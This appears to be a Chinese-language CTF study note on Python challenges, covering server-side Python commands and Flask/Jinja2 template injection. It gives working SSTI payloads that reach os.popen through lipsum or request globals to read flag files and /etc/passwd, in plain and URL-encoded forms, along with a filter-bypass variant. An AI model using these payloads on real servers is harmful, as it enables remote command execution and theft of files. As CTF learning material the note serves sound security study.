---
title: PYTHON题目相关知识
categories: 
tags:
---

## Python相关

### python 常用命令

如果服务端能执行 python 代码，常用的命令可以参考如下：
```python
# 打印信息
print("hello")
# 获取操作系统信息
print(os.version)
# 获取本地文件内容
print(open('/etc/passwd').read())
# 读取当前目录文件
print(os.listdir('.'))
# 获取全局命名空间变量信息
print(globals().values())
```

### Flash SSTI

SSTI Server-Side Template Injection，由于接受用户输入处理不完善而造成的安全问题。

首先找到页面中可以接受用户输入的位置，可能是 GET / POST 参数，也可能是页面 Javascript 触发的后端请求。

使用 `{{ 7*7 }}` 判断是否能注入，如果能计算出结果，则存在诸如的可能。

Python中不同的Web框架，检测注入可能的方法不一样
* Jinja2：`{{7*7}}`
* Freemarker：`${7*7}`
* Flask：`{{7*7}}`

使用 `{{config}}` 尝试获取配置信息。

使用 `{{__class__.__init__.__globals__}}` 访问全局命名空间

`{{lipsum.__globals__['__builtins__']['__import__']('os').popen('cat /app/flag').read()}}`
有的时候发送请求会提示400 错误的请求，这时对内容进行 url 编码
`%7B%7Blipsum.__globals__%5B%27__builtins__%27%5D%5B%27__import__%27%5D%28%27os%27%29.popen%28%27cat%20/app/flag%27%29.read%28%29%7D%7D`

如果 lipsum 被过滤，可以尝试 requests
`{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}`
`%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27cat%20/flag%27%29.read%28%29%7D%7D`

再进一步的通过执行命令，获取保存在服务器文件中的 flag 信息。

## Burpsuite 插件

可以使用 SSTI Hunter 来扫描是否存在注入点

## 参考资料
1. https://github.com/ogtirth/SSTI/blob/main/Payloads%20Cheat%20Sheet.md